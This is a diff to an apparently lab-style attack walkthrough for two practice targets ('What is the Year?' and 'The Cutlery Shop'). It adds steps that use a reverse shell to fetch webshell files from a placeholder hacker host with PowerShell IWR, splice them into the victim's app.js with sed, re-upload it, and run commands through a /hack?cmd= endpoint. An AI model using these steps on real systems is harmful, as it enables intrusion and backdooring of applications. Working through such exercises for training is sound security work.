@@ -84,9 +84,15 @@ Host a web server from `payload/Webshells` directory
 (h) $ cd payload/Webshells
 (h) $ php -S 0.0.0.0:5000
 ```
-Then use the reverse shell to download it on the victim's machine.  
+Then use the reverse shell to download it on the victim's machine.
+
+For "What is the Year?":
 ```
-(v) $ IWR "http://<hacker-ip>:5000/webshell.js" -OutFile .\webshell.js
+(v) $ IWR "http://<hacker-ip>:5000/wity-webshell.js" -OutFile .\webshell.js
+```
+For "The Cutlery Shop":
+```
+(v) $ IWR "http://<hacker-ip>:5000/tcs-webshell.js" -OutFile .\webshell.js
 ```
 
 ## 2.4 Editing Files In Powershell
@@ -119,12 +125,21 @@ Read the contents of `app.js` and keep this reverse shell alive
 (v) $ cat app.js
 ```
 
-### Step 3 - Upload modified `app.js`
-Copy the local file `output.txt` to a local `app.js` and delete unnecessary outputs. Then edit line 39 to include the appropriate [webshell](../Webshells).
+### Step 3 - Modify `app.js`
+Copy the local file `output.txt` to a local `app.js` and delete unnecessary outputs. Then edit the file to include the appropriate [webshell](../Webshells).
+
+For "What is the Year?":
 ```
 (h) $ cp output.txt app.js
-(h) $ sed -i "39r payload/Webshells/webshell.js" app.js
+(h) $ sed -i "17r payload/Webshells/wity-webshell.js" app.js
 ```
+For "The Cutlery Shop":
+```
+(h) $ cp output.txt app.js
+(h) $ sed -i "39r payload/Webshells/tcs-webshell.js" app.js
+```
+
+### Step 4 - Upload `app.js`
 Host a server in the current working directory just like in earlier steps.
 ```
 (h) $ python -m http.server 5000
@@ -148,4 +163,4 @@ http://<victim-ip>:3000/hack?cmd=<command>
 ```
 
 ### Result
-![webshell-screenshot](../../images/webshell.png)
+![webshell-screenshot](../../images/win-result.png)
